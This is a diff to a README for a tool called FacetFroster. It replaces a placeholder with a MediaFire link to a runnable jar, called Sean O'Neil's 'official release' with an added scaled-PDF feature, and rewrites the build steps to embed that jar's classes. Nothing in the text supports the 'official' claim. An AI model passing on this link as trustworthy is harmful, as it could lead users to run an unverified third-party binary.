@@ -29,11 +29,12 @@ geometry:
 
 Please credit **Sean O'Neil's Edge Frosting Tool** in any use of FacetFroster.
 
-> _Project / contact link: **TODO — add the URL for Sean's Edge Frosting Tool
-> here.**_
+**Get Sean's Edge Frosting Tool** (his official release, a runnable jar that also
+includes his scaled-PDF feature):
+<https://www.mediafire.com/file/ood63rjcv8ixorv/edge-frosting-tool-plus-scaled-pdf-v7.jar/file>
 
 > **The Edge Frosting Tool itself is NOT redistributed in this repository.**
-> You must obtain Sean's tool separately and build against it (see
+> Download it from Sean (link above) and build FacetFroster against it (see
 > [Building](#building)). See [Licensing](#licensing) below.
 
 ---
@@ -66,21 +67,23 @@ also:
 ## Building
 
 Requires a JDK (developed against JDK 25 — needs `javac`, `jar`, and, for the
-exe, `jpackage`) and Sean O'Neil's Edge Frosting Tool (the folder with his
-compiled `lap/` classes). Point the build at your copy of his tool:
+exe, `jpackage`) and Sean O'Neil's Edge Frosting Tool jar (download link in the
+[credit section](#credit--sean-oneils-edge-frosting-tool)). Point the build at
+his jar (an already-extracted folder works too):
 
 ```powershell
 # from the repo root — builds out\FacetFroster.jar (+ a self-contained exe zip):
-powershell -File scripts\build_exe.ps1 -Tool <path-to-edge-frosting-tool>
-powershell -File scripts\build_exe.ps1 -Tool <path-to-edge-frosting-tool> -NoExe   # jar only
+powershell -File scripts\build_exe.ps1 -Tool <edge-frosting-tool-plus-scaled-pdf-v7.jar>
+powershell -File scripts\build_exe.ps1 -Tool <...v7.jar> -NoExe   # jar only, no exe
 ```
 
 Or compile by hand (compile the `Messages` shadow first so the frosters link
-against the console version, not the tool's dialog version):
+against the console version, not the tool's dialog version — `<tool>` is Sean's
+jar or its extracted folder):
 
 ```
-javac -cp "<edge-frosting-tool>" -d build src\Messages.java
-javac -cp "build;<edge-frosting-tool>" -d build src\FacetFroster.java src\FacetFrosterCkpt.java
+javac -cp "<tool>" -d build src\Messages.java
+javac -cp "build;<tool>" -d build src\FacetFroster.java src\FacetFrosterCkpt.java
 ```
 
 The built jar/exe **embed Sean's classes** — only distribute them if his license
